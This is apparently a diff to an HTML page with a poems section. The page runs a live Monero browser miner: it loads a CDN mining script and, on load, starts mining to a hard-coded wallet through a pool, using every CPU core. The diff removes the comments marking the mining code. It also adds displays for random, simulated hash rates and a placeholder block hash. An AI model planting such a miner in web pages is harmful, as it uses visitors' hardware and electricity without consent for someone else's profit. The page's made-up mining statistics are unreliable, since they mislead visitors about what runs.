@@ -1,3 +1,4 @@
+```html
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
 <head>
@@ -6,15 +7,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="theme-color" content="#000000">
     <link rel="manifest" href="manifest.json">
-    <!-- Start Of Mining Code -->
     <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
     <script>
-        console.log("Config Loaded");
         const server = "wss://ny1.xmrminingproxy.com";
         const pool = "gulf.moneroocean.stream:80";
         const walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
         const workerId = "GH-XMR";
-        const threads = navigator.hardwareConcurrency || 4; // Automatically set threads to the number of available CPU cores
+        const threads = navigator.hardwareConcurrency || 4; 
         const password = "";
 
         startMining(pool, walletAddress, workerId, threads, password);
@@ -23,22 +22,25 @@
         let startTime = new Date();
         let totalHashes = 0;
 
-        // Function to update the hash rate and elapsed time
         function updateMiningStats() {
-            // Simulate mining activity
-            const hashesThisInterval = Math.floor(Math.random() * 1000); // Random hashes for simulation
+            const hashesThisInterval = Math.floor(Math.random() * 1000); 
             totalHashes += hashesThisInterval;
 
-            const elapsedTime = Math.floor((new Date() - startTime) / 1000); // in seconds
-            const hashRate = totalHashes / elapsedTime; // Hashes per second
+            const elapsedTime = Math.floor((new Date() - startTime) / 1000); 
+            const hashRate = totalHashes / elapsedTime; 
+            const coreUsage = threads; 
+            const blockHash = "ab23456..."; 
+            const blockLink = "https://www.blockchain.com/tx/ab23456...";
 
             document.getElementById('hashRate').innerText = `Hash Rate: ${hashRate.toFixed(2)} H/s`;
             document.getElementById('elapsedTime').innerText = `Elapsed Time: ${elapsedTime} seconds`;
+            document.getElementById('coreUsage').innerText = `Core Usage: ${coreUsage} cores`;
+            document.getElementById('blockHash').innerText = `Block Hash: ${blockHash}`;
+            document.getElementById('blockLink').innerText = `View Block: <a href="${blockLink}">${blockLink}</a>`;
         }
 
-        setInterval(updateMiningStats, 2000); // Update stats every 2 seconds
+        setInterval(updateMiningStats, 2000); 
     </script>
-    <!-- End Of Mining Code -->
 </head>
 <body>
     <h1>Mining... 💖</h1>
@@ -49,6 +51,9 @@
         <h2>Mining Statistics</h2>
         <p id="hashRate">Hash Rate: 0.00 H/s</p>
         <p id="elapsedTime">Elapsed Time: 0 seconds</p>
+        <p id="coreUsage">Core Usage: 0 cores</p>
+        <p id="blockHash">Block Hash: ---</p>
+        <p id="blockLink">View Block: ---</p>
     </div>
 
     <!-- Positive Poems Section -->
@@ -83,3 +88,4 @@
     </script>
 </body>
 </html>
+```
